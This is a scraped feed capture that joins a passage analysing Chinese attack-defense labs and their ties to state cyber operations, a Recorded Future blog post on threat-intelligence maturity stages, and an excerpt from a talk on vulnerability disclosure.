Industry trends suggest the demand for attack-defense capability is expanding.</p><p>According to a December 2023 <a href=\"https://www.sohu.com/a/745373795_120846244\" rel=\"noopener\" target=\"_blank\">analysis </a>by Anquan 419, a Chinese cybersecurity industry news outlet, China\u2019s cybersecurity market is shifting from a compliance-dominated model to one increasingly focused on attack-defense. A January 2025 report <a href=\"https://www.secrss.com/articles/74983\" rel=\"noopener\" target=\"_blank\">published </a>by Hufu Think Tank (\u864e\u7b26\u667a\u5e93), <a href=\"https://www.qianxin.com/news/detail?news_id=992&amp;utm_source=chatgpt.com\" rel=\"noopener\" target=\"_blank\">founded by</a> <a href=\"https://nattothoughts.substack.com/p/china-as-a-target-of-cyberattacks\" rel=\"noopener\" target=\"_blank\">Qi An Xin</a>, further supports this trend, noting that <a href=\"https://nattothoughts.substack.com/i/142403030/alternative-route-to-recruit\" rel=\"noopener\" target=\"_blank\">attack-defense live-fire capability</a> is increasingly regarded as the primary engine of cybersecurity innovation.</p><p>Recent policy developments reinforce the trajectory. A July 2025 draft regulation titled <a href=\"https://web.archive.org/web/20251112161935/https:/hengyukeji.cn/NewsDetail/6014278.html\" rel=\"noopener\" target=\"_blank\">\u201cCapability Requirements and Evaluation Specifications for Assessment Organizations of Classified Protection of Cybersecurity (\u7f51\u7edc\u5b89\u5168\u7b49\u7ea7\u4fdd\u62a4\u6d4b\u8bc4\u673a\u6784\u80fd\u529b\u8981\u6c42\u548c \u8bc4\u4f30\u8303\u56f4),\u201d</a> which closed for comments in September 2025, requires \u201cassessment organizations\u201d \u2013 that is, certified cybersecurity testing firms \u2013 to maintain a dedicated attack-defense lab (\u4e13\u95e8\u7684\u653b\u9632\u5b9e\u9a8c\u5ba4) with at least 10 technicians. These technicians must have experience in national-level security monitoring, threat warning, drills, and emergency response, and be able to integrate offensive and defensive skills, conduct technical research, and cultivate talent. This represents an update to the 2018 requirements, which <a href=\"https://pro5323b5d3-pic11.ysjianzhan.cn/upload/166_GB-T36959-2018XXAQJSWLAQDJBHCPJGNLYQHPGGF.pdf\" rel=\"noopener\" target=\"_blank\">did not explicitly mandate</a> the creation of attack-defense labs.</p><p>Chinese attack-defense labs have also been in demand internationally. Tencent\u2019s Keen Lab \u2013 known for its automotive cybersecurity research<a href=\"https://nattothoughts.substack.com#footnote-10\" rel=\"noopener\" target=\"_blank\">10</a> \u2013 received the 2018 \u201cBMW Group Digital and IT R&amp;D Technology Award\u201d for uncovering flaws in models produced by BMW, a leading German automaker. BMW Group reported that it was<a href=\"https://www.press.bmwgroup.com/global/article/detail/T0281245EN/first-ever-bmw-group-digitalization-and-it-research-award-goes-to-tencent-keen-security-lab-for-their-connectivity-and-cybersecurity-research-the-two-companies-plan-to-expand-their-cooperation-and-joint-research-work?language=en\" rel=\"noopener\" target=\"_blank\"> discussing</a> options for \u201cjoint in-depth research and development activities\u201d with Tencent Keen Lab, though we could not identify more recent examples of collaboration. Keen Lab also conducted an eight-month code audit with Mercedes-Benz, another major German automaker, releasing the <a href=\"https://keenlab.tencent.com/en/whitepapers/Mercedes_Benz_Security_Research_Report_Final.pdf\" rel=\"noopener\" target=\"_blank\">\u201cMercedes-Benz Automobile Information Security Research Review Report\u201d</a> in May 2021, which disclosed several major vulnerabilities, including four enabling remote code execution.</p><p><a href=\"https://nattothoughts.substack.com/subscribe\" rel=\"noopener\" target=\"_blank\">Subscribe now</a></p><h2>Attack and Defense Labs Assist State Cyber Operations</h2><p>Chinese government agencies have increasingly drawn on the growing capabilities of attack-defense labs within domestic cybersecurity firms to support state cyber operations with offensive tool development, vulnerability research and exploitation, and counter-cybercrime support.</p><p>A first set of examples illustrates how attack-defense labs contribute to operational offensive tooling. Integrity Tech, one of China\u2019s leading cyber-range developers, was linked to the Flax Typhoon threat actor. According to a <a href=\"https://www.justice.gov/archives/opa/media/1369156/dl/dl?inline\" rel=\"noopener\" target=\"_blank\">2024 FBI affidavit</a>, the group used an application called Sparrow (\u9ebb\u96c0) to control a botnet capable of file transfers, remote command execution, lateral movement, and cyberattacks. The Sparrow repository, along with embedded tools, repeatedly referenced the \u201cKRLab,\u201d Integrity Tech\u2019s internal attack-defense lab.<a href=\"https://nattothoughts.substack.com#footnote-11\" rel=\"noopener\" target=\"_blank\">11</a> A similar pattern emerged in November 2025, when MSS-affiliated clusters including UNC5174 were linked to the dual-use VShell remote access tool (RAT). European cybersecurity firm NVISO <a href=\"https://blog.nviso.eu/wp-content/uploads/2025/11/VShell.pdf\" rel=\"noopener\" target=\"_blank\">assessed</a> that DBAPP Security\u2019s Starfire Lab maintained VShell in a 2025 report. The report noted that VShell began as a defensive research project around 2021 but later evolved into a functional backdoor used by several China-nexus threat actors. How the tool moved from DBAPP\u2019s lab into operational use remains unclear.</p><p>Another set of cases illustrates that beyond China\u2019s mandated vulnerability disclosure system \u2013 which <a href=\"https://nattothoughts.substack.com/p/chinas-vulnerability-research-whats\" rel=\"noopener\" target=\"_blank\">channels new findings</a> to government authorities \u2013 some labs also appear to develop exploit code. In October 2024, Sophos\u2019 \u201cPacific Rim\u201d investigation observed devices running commands consistent with exploit development and <a href=\"https://news.sophos.com/en-us/2024/10/31/pacific-rim-neutralizing-china-based-threat/\" rel=\"noopener\" target=\"_blank\">concluded</a> that they belonged to Sichuan Silence\u2019s Double Helix Research Institute, an attack-defense lab. In the same period, a Financial Times investigation drawing on intelligence in a White House national-security memo <a href=\"https://www.ft.com/content/30fb83a0-8cb9-4805-b5d2-19b5ef510043\" rel=\"noopener\" target=\"_blank\">reported </a>that Alibaba employees \u201chad transferred knowledge about \u2018zero-day\u2019 exploits to the PLA.\u201d Although the report did not specify the internal Alibaba unit involved, the reference to zero-day vulnerability or exploit work could point to <a href=\"https://s.alibaba.com/news/detail/141/partners\" rel=\"noopener\" target=\"_blank\">Alibaba\u2019s Orion Lab</a> (\u730e\u6237\u5ea7\u5b9e\u9a8c\u5ba4), known for <a href=\"https://msrc.microsoft.com/update-guide/acknowledgement\" rel=\"noopener\" target=\"_blank\">conducting vulnerability research</a> in U.S. products.</p><p>Other cases show attack-defense labs contributing to law-enforcement operations to tackle cybercrime. Pangu Labs <a href=\"https://nattothoughts.substack.com/p/the-pangu-teamios-jailbreak-and-vulnerability\" rel=\"noopener\" target=\"_blank\">has supported</a> investigations by exploiting vulnerabilities and using targeted phishing to infiltrate suspects\u2019 systems. Integrity Tech\u2019s KRLab similarly <a href=\"https://guillaumecorneautremblay.substack.com/p/flax-typhoon-exposing-integrity-techs\" rel=\"noopener\" target=\"_blank\">claimed to provide</a> long-standing cybercrime intelligence and investigative support to national and provincial public security organs, helping resolve hundreds of cases.</p><h2>Defense Builders or Operation Enablers?</h2><p>China\u2019s cybersecurity industry has evolved around the idea that offense and defense develop together. This mindset <a href=\"https://nattothoughts.substack.com/p/no-ranges-no-bounties-no-contests\" rel=\"noopener\" target=\"_blank\">has shaped</a> how companies organize, how talent is trained, and how capabilities ultimately flow into state activity. Attack-defense labs sit at the center of this system: they drive commercial innovation while generating tools, techniques, and expertise that both strengthen defensive capabilities and enable state-sponsored operations.</p><p>For China, this integrated model is now a structural feature of the cybersecurity market, reinforced by policy, investment, and the broader commercial ecosystem in which these labs operate. Natto Thoughts has conducted extensive work to understand this ecosystem and how these companies\u2019 capabilities intersect with state interests (see <a href=\"https://nattothoughts.substack.com/p/business-priorities-of-chinese-cyber\" rel=\"noopener\" target=\"_blank\">here</a>, <a href=\"https://nattothoughts.substack.com/p/butian-vulnerability-platform-forging\" rel=\"noopener\" target=\"_blank\">here</a>, and <a href=\"https://nattothoughts.substack.com/p/flax-typhoon-linked-company-integrity\" rel=\"noopener\" target=\"_blank\">here</a>).

Under this deluge of data, many organizations find themselves struggling to actually make sense of, let alone use of, all this information.&lt;/li&gt;\n      &lt;li&gt;Recorded Future offers a concrete threat intelligence maturity journey organizations can follow in order to evolve from this reactive state of intelligence overload, to a more value-added state. The four stages of this journey include: Reactive, Proactive, Predictive, and Autonomous.&lt;/li&gt;\n      &lt;li&gt;Along the course of this journey, organizations will take clear steps to go from responding to threats after detection, to preventing known threats, all the way to using automation to self-direct threat responses with minimal human intervention&lt;/li&gt;\n      &lt;li&gt;Platforms like Recorded Future provide the data, context, and automation to accelerate your journey toward operational cyber threat intelligence maturity.&lt;/li&gt;\n    &lt;/ul&gt;\n    &lt;h2&gt;The Information Overload Problem: Why More isn\u2019t Always Better&lt;/h2&gt;\n    &lt;p&gt;Your security operations center (SOC) runs multiple &lt;a href=\"https://www.recordedfuture.com/threat-intelligence\" rel=\"noreferrer\" target=\"_blank\"&gt;threat intelligence&lt;/a&gt; feeds around the clock. Hundreds of alerts pour in daily\u2014indicators of compromise (IOCs), suspicious IP addresses, emerging vulnerabilities, and more. Yet despite all this data, the team still spends much of its day reacting to alerts, rather than staying ahead of threats. Valuable data is stored, analyzed, and even given high visibility, but rarely acted upon in time to make a difference.&lt;/p&gt;\n    &lt;p&gt;This is the information overload problem, and it\u2019s widening the gap between information and action. Organizations collect and subscribe to vast quantities of threat data from multiple sources, but few have the threat intelligence capabilities\u2014the processes, integrations, and automation\u2014required to add context to all that data and transform it into measurable security outcomes.&lt;/p&gt;\n    &lt;p&gt;The problem isn\u2019t the data itself. It\u2019s the operationalization of it. That is to say, the ability to use threat data efficiently, contextually, and predictively across the security ecosystem. As Recorded Future highlights in its &lt;em&gt;&lt;a href=\"https://www.recordedfuture.com/resources/maturity-assessment#:~:text=Our%20free%20interactive%20assessment%20evaluates%20your%20capabilities%2C%20reveals,biggest%20ROI%20opportunities%2C%20quick%20wins%2C%20and%20tailored%20recommendations.\" rel=\"noreferrer\" target=\"_blank\"&gt;Threat Intelligence Maturity Assessment&lt;/a&gt;&lt;/em&gt;, most organizations are somewhere along a journey toward maturity, moving from purely reactive intelligence to fully autonomous operations.&lt;/p&gt;\n    &lt;p&gt;This post explores that path, offering a practical roadmap for transforming raw alerts into &lt;a href=\"https://www.recordedfuture.com/blog/operational-threat-intelligence\" rel=\"noreferrer\" target=\"_blank\"&gt;operational cyber threat intelligence&lt;/a&gt;. Using the four stages of maturity (i.e. Reactive, Proactive, Predictive, and Autonomous) we\u2019ll show how organizations can evolve their security programs from putting out fires to acting with foresight.&lt;/p&gt;\n    &lt;div&gt;\n      &lt;div&gt;\n        &lt;div&gt;\n          &lt;img alt=\"\" height=\"600\" src=\"https://www.recordedfuture.com/media_1f6ac9cee9a486fb9ce3a44eb5022a60f1b6814ba.png?width=750&amp;amp;format=png&amp;amp;optimize=medium\" width=\"1600\" /&gt;\n        &lt;/div&gt;\n      &lt;/div&gt;\n      &lt;div&gt;\n        &lt;div&gt;&lt;em&gt;Stages of Recorded Future\u2019s Threat Intelligence Maturity Model&lt;/em&gt;&lt;/div&gt;\n      &lt;/div&gt;\n    &lt;/div&gt;\n    &lt;h2&gt;The Threat Intelligence Maturity Model: From Reactive to Autonomous&lt;/h2&gt;\n    &lt;p&gt;Threat intelligence isn\u2019t a binary capability. It exists on a continuum. As organizations gain visibility, automation, and analytical depth, their approach to threat intelligence evolves. Recorded Future\u2019s &lt;em&gt;&lt;a href=\"https://www.recordedfuture.com/resources/maturity-assessment\" rel=\"noreferrer\" target=\"_blank\"&gt;Threat Intelligence Maturity Model&lt;/a&gt;&lt;/em&gt; defines this journey in four stages:&lt;/p&gt;\n    &lt;ol&gt;\n      &lt;li&gt;&lt;strong&gt;Reactive&lt;/strong&gt;: Responding to threats after detection.&lt;/li&gt;\n      &lt;li&gt;&lt;strong&gt;Proactive&lt;/strong&gt;: Preventing known threats before impact.&lt;/li&gt;\n      &lt;li&gt;&lt;strong&gt;Predictive&lt;/strong&gt;: Anticipating threats before they materialize.&lt;/li&gt;\n      &lt;li&gt;&lt;strong&gt;Autonomous&lt;/strong&gt;: Enabling self-directing, intelligence-led defense at machine speed.&lt;/li&gt;\n    &lt;/ol&gt;\n    &lt;p&gt;Each stage represents a significant leap in capability, mindset, and operational efficiency. Progress along this path requires more than just technology. It depends equally on people, processes, and the integration of intelligence into everyday decision-making.&lt;/p&gt;\n    &lt;p&gt;In the sections that follow, we\u2019ll explore what defines each stage, common challenges, measurable KPIs, and key actions to help organizations advance their threat intelligence operations.&lt;/p&gt;\n    &lt;h3&gt;Stage 1: Reactive\u2014Responding to What\u2019s Already Happened&lt;/h3&gt;\n    &lt;p&gt;\n      &lt;img alt=\"\" height=\"400\" src=\"https://www.recordedfuture.com/media_1c193da9e8d214f4a7e3c8f9d9eeb9360d05300c3.png?width=750&amp;amp;format=png&amp;amp;optimize=medium\" width=\"1600\" /&gt;\n    &lt;/p&gt;\n    &lt;p&gt;In the Reactive stage, organizations are still fighting fires. &lt;a href=\"https://www.recordedfuture.com/products/vulnerability-intelligence\" rel=\"noreferrer\" target=\"_blank\"&gt;Various forms of intelligence&lt;/a&gt; are consumed, but rarely operationalized. Analysts &lt;a href=\"https://www.recordedfuture.com/blog/why-manual-cyber-operations-can-create-dangerous-gaps\" rel=\"noreferrer\" target=\"_blank\"&gt;manually investigate alerts&lt;/a&gt;, cross reference indicators, and often rely on intuition or Google searches to make sense of raw data.&lt;/p&gt;\n    &lt;p&gt;This stage is typical for teams suffering from alert fatigue or lacking dedicated threat intelligence personnel. Intelligence feeds may be connected to security tools, but without clear processes, much of that data sits unutilized.&lt;/p&gt;\n    &lt;p&gt;&lt;strong&gt;Characteristics of a Reactive Organization&lt;/strong&gt;&lt;/p&gt;\n    &lt;ul&gt;\n      &lt;li&gt;Focused on detection and containment.&lt;/li&gt;\n      &lt;li&gt;Success means closing incidents, not necessarily preventing them.&lt;/li&gt;\n      &lt;li&gt;However, this stage is where the foundation for maturity is built.&lt;/li&gt;\n    &lt;/ul&gt;\n    &lt;p&gt;&lt;strong&gt;Pain Points and Challenges&lt;/strong&gt;&lt;/p&gt;\n    &lt;ul&gt;\n      &lt;li&gt;Overload without insight: Teams receive too many alerts to analyze effectively.&lt;/li&gt;\n      &lt;li&gt;Siloed tools and workflows: Intelligence isn\u2019t integrated across the stack.&lt;/li&gt;\n      &lt;li&gt;Limited automation: Manual lookups and enrichment dominate response time.&lt;/li&gt;\n      &lt;li&gt;High dwell time: Threats are detected after the fact, often too late for meaningful containment.&lt;/li&gt;\n    &lt;/ul&gt;\n    &lt;p&gt;&lt;strong&gt;Steps to Advance&lt;/strong&gt;&lt;/p&gt;\n    &lt;ul&gt;\n      &lt;li&gt;Centralize intelligence feeds into a single operational view.&lt;/li&gt;\n      &lt;li&gt;Automate enrichment of alerts with high-confidence threat indicators.&lt;/li&gt;\n      &lt;li&gt;Establish workflows for classifying, triaging, and escalating alerts based on context.&lt;/li&gt;\n      &lt;li&gt;Begin correlating IOCs with known campaigns or adversary tactics.&lt;/li&gt;\n    &lt;/ul&gt;\n    &lt;p&gt;&lt;strong&gt;Success Indicators and KPIs&lt;/strong&gt;&lt;/p&gt;\n    &lt;p&gt;Across the industry, certain standards, KPIs and other measures have emerged to help orient and assess one\u2019s progress through each stage of the maturity journey. For the Reactive stage, these include:&lt;/p&gt;\n    &lt;ul&gt;\n      &lt;li&gt;Reduction in duplicate or \u201cknown bad\u201d alerts.&lt;/li&gt;\n      &lt;li&gt;Decrease in manual investigations per analyst.&lt;/li&gt;\n      &lt;li&gt;Improved Mean Time to Triage (MTTT): faster analysis of known threats.&lt;/li&gt;\n      &lt;li&gt;Greater integration between intelligence feeds and alert management.&lt;/li&gt;\n    &lt;/ul&gt;\n    &lt;p&gt;The Reactive stage is about laying the groundwork for operationalized intelligence, consolidating data and reducing noise so analysts can focus on meaningful threats. Once teams can respond consistently and efficiently, they\u2019re ready to evolve toward a proactive posture.&lt;/p&gt;\n    &lt;h3&gt;Stage 2: Proactive\u2014Preventing Known Threats&lt;/h3&gt;\n    &lt;p&gt;\n      &lt;img alt=\"\" height=\"400\" src=\"https://www.recordedfuture.com/media_1fc1b038d0f8112a450d00812f76e30ff86907e12.png?width=750&amp;amp;format=png&amp;amp;optimize=medium\" width=\"1600\" /&gt;\n    &lt;/p&gt;\n    &lt;p&gt;The Proactive stage marks a crucial transition from reacting to known events to actively preventing them. Here, organizations begin to enrich alerts with context, prioritize risk, and use intelligence to inform vulnerability management and threat hunting.&lt;/p&gt;\n    &lt;p&gt;Teams at this stage have moved beyond basic detection. They use intelligence to drive decision-making, asking \u201cWhat matters most to us?\u201d instead of simply responding to what the feeds say.&lt;/p&gt;\n    &lt;p&gt;&lt;strong&gt;Characteristics of a Proactive Organization&lt;/strong&gt;&lt;/p&gt;\n    &lt;ul&gt;\n      &lt;li&gt;Security teams conduct regular threat hunting exercises to identify indicators of compromise before alerts fire.&lt;/li&gt;\n      &lt;li&gt;Vulnerability management programs are intelligence-led, prioritizing patches based on real-world exploitation trends.&lt;/li&gt;\n      &lt;li&gt;Analysts can articulate threat actor behaviors and motivations, not just indicators.&lt;/li&gt;\n      &lt;li&gt;Intelligence is beginning to inform executive-level reporting and risk assessments.&lt;/li&gt;\n    &lt;/ul&gt;\n    &lt;p&gt;&lt;strong&gt;Pain Points and Challenges&lt;/strong&gt;&lt;/p&gt;\n    &lt;ul&gt;\n      &lt;li&gt;Context overload: Adding intelligence without prioritization can still create noise.&lt;/li&gt;\n      &lt;li&gt;Scaling analysis: Manual research can\u2019t keep up with threat volume.&lt;/li&gt;\n      &lt;li&gt;Communication gaps: Intelligence insights may not reach decision-makers fast enough.&lt;/li&gt;\n    &lt;/ul&gt;\n    &lt;p&gt;&lt;strong&gt;Steps to Advance&lt;/strong&gt;&lt;/p&gt;\n    &lt;ul&gt;\n      &lt;li&gt;Integrate enrichment and context directly into alert workflows.&lt;/li&gt;\n      &lt;li&gt;Use intelligence to prioritize vulnerabilities being actively exploited in the wild.&lt;/li&gt;\n      &lt;li&gt;Establish a repeatable threat hunting process tied to known tactics, techniques and procedures (TTPs).&lt;/li&gt;\n      &lt;li&gt;Create basic reporting dashboards to show intelligence-driven outcomes to leadership.&lt;/li&gt;\n    &lt;/ul&gt;\n    &lt;p&gt;&lt;strong&gt;Success Indicators and KPIs&lt;/strong&gt;&lt;/p&gt;\n    &lt;p&gt;As outlined above, industry best practices and our own internal expertise has helped to inform clear indicators of success and measurable KPIs to help you traverse this stage:&lt;/p&gt;\n    &lt;ul&gt;\n      &lt;li&gt;Further reduction in Mean Time to Respond (MTTR) and faster full-cycle incident resolution.&lt;/li&gt;\n      &lt;li&gt;Increase in incidents identified through proactive hunting.&lt;/li&gt;\n      &lt;li&gt;Decrease in unpatched, high-risk vulnerabilities.&lt;/li&gt;\n      &lt;li&gt;More consistent cross-departmental sharing of intelligence insights.&lt;/li&gt;\n    &lt;/ul&gt;\n    &lt;p&gt;Proactive organizations are no longer purely reactive responders; they are early detectors. They use operational cyber threat intelligence to stop known attacks before they strike, ridging the gap between detection and prevention.&lt;/p&gt;\n    &lt;h3&gt;Stage 3: Predictive\u2014Anticipating What\u2019s Next&lt;/h3&gt;\n    &lt;p&gt;\n      &lt;img alt=\"\" height=\"400\" src=\"https://www.recordedfuture.com/media_182c7617c0aa63432375b741a10c23a269f507446.png?width=750&amp;amp;format=png&amp;amp;optimize=medium\" width=\"1600\" /&gt;\n    &lt;/p&gt;\n    &lt;p&gt;At the Predictive stage, organizations transform from defenders into forecasters. Intelligence isn\u2019t just about identifying active threats. It\u2019s about anticipating what adversaries will do next.&lt;/p&gt;\n    &lt;p&gt;Predictive intelligence uses advanced analytics, automation, and pattern recognition to reveal emerging campaigns, shifting tactics, and vulnerabilities before they\u2019re exploited. At this stage, intelligence becomes strategic, influencing not just SOC operations but enterprise-wide risk management and planning.&lt;/p&gt;\n    &lt;p&gt;&lt;strong&gt;Characteristics of a Predictive Organization&lt;/strong&gt;&lt;/p&gt;\n    &lt;ul&gt;\n      &lt;li&gt;Security and risk teams share a unified intelligence strategy.&lt;/li&gt;\n      &lt;li&gt;Machine learning and AI tools help identify evolving threat trends.&lt;/li&gt;\n      &lt;li&gt;Insights extend beyond cyber to supply chain, digital risk, and geopolitical factors.&lt;/li&gt;\n      &lt;li&gt;The organization uses predictive intelligence to guide security investment decisions.&lt;/li&gt;\n    &lt;/ul&gt;\n    &lt;p&gt;&lt;strong&gt;Pain Points and Challenges&lt;/strong&gt;&lt;/p&gt;\n    &lt;ul&gt;\n      &lt;li&gt;Data interpretation: Turning predictive signals into actionable decisions.&lt;/li&gt;\n      &lt;li&gt;Cross-functional alignment: Intelligence must inform departments beyond security (legal, procurement, communications).&lt;/li&gt;\n      &lt;li&gt;Maintaining analyst trust in automation, ensuring predictive systems remain transparent and explainable.&lt;/li&gt;\n    &lt;/ul&gt;\n    &lt;p&gt;&lt;strong&gt;Steps to Advance&lt;/strong&gt;&lt;/p&gt;\n    &lt;ul&gt;\n      &lt;li&gt;Combine internal telemetry with external intelligence for a 360\u00b0 threat view.&lt;/li&gt;\n      &lt;li&gt;Monitor emerging TTPs and map them to organizational exposures.&lt;/li&gt;\n      &lt;li&gt;Develop scenario-based playbooks informed by predictive analysis.&lt;/li&gt;\n      &lt;li&gt;Use predictive insights to shape security budgets and executive strategy.&lt;/li&gt;\n    &lt;/ul&gt;\n    &lt;p&gt;&lt;strong&gt;Success Indicators and KPIs&lt;/strong&gt;&lt;/p&gt;\n    &lt;ul&gt;\n      &lt;li&gt;Significant reduction in average dwell time (threats neutralized before causing damage).&lt;/li&gt;\n      &lt;li&gt;Overall percentage of threats mitigated before exploitation.&lt;/li&gt;\n      &lt;li&gt;Increased accuracy of threat forecasting.&lt;/li&gt;\n      &lt;li&gt;Improved strategic alignment between security and business objectives.&lt;/li&gt;\n    &lt;/ul&gt;\n    &lt;p&gt;The Predictive stage represents the maturation of threat intelligence operations. Security becomes a forward-looking function\u2014one that can anticipate risk and shape outcomes, rather than merely react and respond to them.&lt;/p&gt;\n    &lt;h3&gt;Stage 4: Autonomous\u2014Intelligence at Machine Speed&lt;/h3&gt;\n    &lt;p&gt;\n      &lt;img alt=\"\" height=\"400\" src=\"https://www.recordedfuture.com/media_1c74008a813f7e84c128161a489a5f6ffbf9b477f.png?width=750&amp;amp;format=png&amp;amp;optimize=medium\" width=\"1600\" /&gt;\n    &lt;/p&gt;\n    &lt;p&gt;The Autonomous stage represents the pinnacle of operational cyber threat intelligence maturity. At this point, intelligence systems and &lt;a href=\"https://www.recordedfuture.com/blog/how-the-right-ai-enables-an-autonomous-future\" rel=\"noreferrer\" target=\"_blank\"&gt;AI-driven automation&lt;/a&gt; operate continuously: detecting, analyzing, and responding to threats with minimal human intervention.&lt;/p&gt;\n    &lt;p&gt;Here, human analysts focus on strategic research, oversight, and long-term planning while machines handle routine detection and response. Intelligence is fully operationalized, driving every aspect of the security ecosystem in real time.&lt;/p&gt;\n    &lt;p&gt;&lt;strong&gt;Characteristics of an Autonomous Organization&lt;/strong&gt;&lt;/p&gt;\n    &lt;ul&gt;\n      &lt;li&gt;Threat intelligence is deeply integrated across all systems and workflows.&lt;/li&gt;\n      &lt;li&gt;AI and automation enable continuous detection and response without manual triggers.&lt;/li&gt;\n      &lt;li&gt;The organization has global visibility into digital, third-party, and geopolitical risks.&lt;/li&gt;\n      &lt;li&gt;Threat intelligence is recognized as a strategic business differentiator.&lt;/li&gt;\n    &lt;/ul&gt;\n    &lt;p&gt;&lt;strong&gt;Pain Points and Challenges&lt;/strong&gt;&lt;/p&gt;\n    &lt;ul&gt;\n      &lt;li&gt;Governance and oversight: Ensuring automated decisions remain transparent and aligned with policy.&lt;/li&gt;\n      &lt;li&gt;Cultural adaptation: Building trust in autonomous operations among leadership and analysts.&lt;/li&gt;\n      &lt;li&gt;Optimization: Continuously tuning models and workflows for performance and precision.&lt;/li&gt;\n    &lt;/ul&gt;\n    &lt;p&gt;&lt;strong&gt;Steps to Advance&lt;/strong&gt;&lt;/p&gt;\n    &lt;ul&gt;\n      &lt;li&gt;Expand autonomous intelligence integration across the full security stack.&lt;/li&gt;\n      &lt;li&gt;Enable continuous enrichment of intelligence data for context-aware decision-making.&lt;/li&gt;\n      &lt;li&gt;Automate rule creation and response playbooks based on live threat insights.&lt;/li&gt;\n      &lt;li&gt;Use AI to generate executive-level summaries and automated intelligence reporting.&lt;/li&gt;\n    &lt;/ul&gt;\n    &lt;p&gt;&lt;strong&gt;Success Indicators and KPIs&lt;/strong&gt;&lt;/p&gt;\n    &lt;ul&gt;\n      &lt;li&gt;High rate of automated response actions.&lt;/li&gt;\n      &lt;li&gt;Continuous reduction in dwell time.&lt;/li&gt;\n      &lt;li&gt;Consistent threat mitigation without human escalation.&lt;/li&gt;\n      &lt;li&gt;Cross-functional visibility and reporting of intelligence outcomes.&lt;/li&gt;\n    &lt;/ul&gt;\n    &lt;p&gt;In the Autonomous stage, the line between intelligence and action disappears. Security operations are intelligence-led and self-improving, creating a closed-loop system that operates at the same speed as the adversaries it defends against.&lt;/p&gt;\n    &lt;h2&gt;Fueling the Engine: How Intelligence Powers Every Stage&lt;/h2&gt;\n    &lt;p&gt;Progression through these maturity stages depends on the quality, breadth, and automation of the &lt;a href=\"https://www.recordedfuture.com/threat-intelligence-101/tools-and-technologies\" rel=\"noreferrer\" target=\"_blank\"&gt;underlying intelligence platform&lt;/a&gt;. Recorded Future\u2019s ecosystem exemplifies this principle\u2014providing comprehensive data, contextual insights, and machine-speed automation to advance organizations along the maturity curve.&lt;/p&gt;\n    &lt;div&gt;\n      &lt;div&gt;\n        &lt;div&gt;\n          &lt;h2&gt;Stage&lt;/h2&gt;\n        &lt;/div&gt;\n        &lt;div&gt;\n          &lt;h2&gt;Primary Intelligence Focus&lt;/h2&gt;\n        &lt;/div&gt;\n        &lt;div&gt;\n          &lt;h2&gt;Outcome&lt;/h2&gt;\n        &lt;/div&gt;\n      &lt;/div&gt;\n      &lt;div&gt;\n        &lt;div&gt;Reactive&lt;/div&gt;\n        &lt;div&gt;High-confidence indicator feeds (IPs, domains, hashes).&lt;/div&gt;\n        &lt;div&gt;Faster triage and response to known threats.&lt;/div&gt;\n      &lt;/div&gt;\n      &lt;div&gt;\n        &lt;div&gt;Proactive&lt;/div&gt;\n        &lt;div&gt;Context-rich intelligence: vulnerability data, actor profiles, and exploit trends.&lt;/div&gt;\n        &lt;div&gt;Prioritized patching and early threat detection.&lt;/div&gt;\n      &lt;/div&gt;\n      &lt;div&gt;\n        &lt;div&gt;Predictive&lt;/div&gt;\n        &lt;div&gt;Strategic insights: TTPs, campaign monitoring, and predictive modeling.&lt;/div&gt;\n        &lt;div&gt;Anticipation of future threats and informed investments.&lt;/div&gt;\n      &lt;/div&gt;\n      &lt;div&gt;\n        &lt;div&gt;Autonomous&lt;/div&gt;\n        &lt;div&gt;Always-on AI-driven analysis and automation.&lt;/div&gt;\n        &lt;div&gt;Continuous detection, response, and operational resilience.&lt;/div&gt;\n      &lt;/div&gt;\n    &lt;/div&gt;\n    &lt;p&gt;At every stage, operational cyber threat intelligence is both the fuel and the framework for progress. It informs decisions, shapes response playbooks, and empowers organizations to act faster, smarter, and with greater confidence.&lt;/p&gt;\n    &lt;h2&gt;Your Next Move on the Journey to Operational Intelligence Maturity&lt;/h2&gt;\n    &lt;p&gt;Operationalizing threat intelligence is not a single milestone, it\u2019s a journey. Each stage builds upon the last, requiring time, structure, and deliberate investment in people, process, and intelligence integration. Just like a human learning to crawl, walk, run, and sprint, the journey towards maturity is rich with both challenges and rewards.&lt;/p&gt;\n    &lt;p&gt;The key is honest assessment:&lt;/p&gt;\n    &lt;ul&gt;\n      &lt;li&gt;Are you still chasing alerts in a reactive, ad hoc fashion?&lt;/li&gt;\n      &lt;li&gt;Have you begun to anticipate known threats through proactive hunting and prioritization?&lt;/li&gt;\n      &lt;li&gt;Are you using predictive analytics to anticipate emerging risks?&lt;/li&gt;\n      &lt;li&gt;Or have you reached autonomous operations, where intelligence drives decisions at machine speed?&lt;/li&gt;\n    &lt;/ul&gt;\n    &lt;p&gt;Wherever you are today, your next move determines how effectively your organization can predict, prevent, and protect against tomorrow\u2019s threats.&lt;/p&gt;\n    &lt;p&gt;Whether you\u2019re integrating your first intelligence feed or orchestrating fully &lt;a href=\"https://www.recordedfuture.com/products/autonomous-threat-operations\" rel=\"noreferrer\" target=\"_blank\"&gt;autonomous threat response&lt;/a&gt;, Recorded Future provides the data, context, and automation to accelerate your journey toward operational cyber threat intelligence maturity.&lt;/p&gt;\n</code></pre>\n<p>Article Link: <a class=\"inline-onebox\" href=\"https://www.recordedfuture.com/blog/operational-cyber-threat-intelligence\">Operational Cyber Threat Intelligence</a></p>\n            <p><small>1 post - 1 participant</small></p>\n            <p><a href=\"https://malware.news/t/operational-cyber-threat-intelligence/101756\">Read full topic</a></p>",

This is the talk.</p>\n<blockquote><p>Thirty years ago, a debate raged over whether vulnerability disclosure was good for computer security. On one side, full disclosure advocates argued that software bugs weren&#8217;t getting fixed and wouldn&#8217;t get fixed if companies that made insecure software wasn&#8217;t called out publicly. On the other side, companies argued that full disclosure led to exploitation of unpatched vulnerabilities, especially if they were hard to fix. After blog posts, public debates, and countless mailing list flame wars, there emerged a compromise solution: coordinated vulnerability disclosure, where vulnerabilities were disclosed after a period of confidentiality where vendors can attempt to fix things. Although full disclosure fell out of fashion, disclosure won and security through obscurity lost. We&#8217;ve lived happily ever after since...</p></blockquote>",

